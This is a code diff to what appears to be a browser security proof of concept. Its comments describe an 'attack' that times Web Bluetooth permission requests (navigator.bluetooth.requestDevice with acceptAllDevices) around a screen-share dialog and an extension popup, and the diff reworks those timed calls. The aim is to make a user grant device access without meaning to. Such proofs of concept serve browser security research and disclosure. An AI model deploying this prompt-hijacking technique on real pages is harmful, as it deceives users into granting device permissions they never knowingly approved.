@@ -31,6 +31,7 @@ if (isScreenShare) {
 } else {
   instructionsPlay.classList.add('show');
 }
+        navigator.bluetooth.requestDevice({acceptAllDevices:true})
 
 window.addEventListener('keydown', (e) => {
   // Open prompt on 'ctrl'
@@ -40,8 +41,8 @@ window.addEventListener('keydown', (e) => {
       // Slight delay here to reduce time where screen share dialog is visible but extension popup is still opening.
       // If we call getDisplayMedia() *after* extension popup is opened, the extension popup is closed and attack fails.
       setTimeout(() => {
-        setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 10);
-        setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 800)
+        navigator.bluetooth.requestDevice({acceptAllDevices:true})
+        setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 400)
       }, 1);
     } else {
       // Main scenario: permission prompt
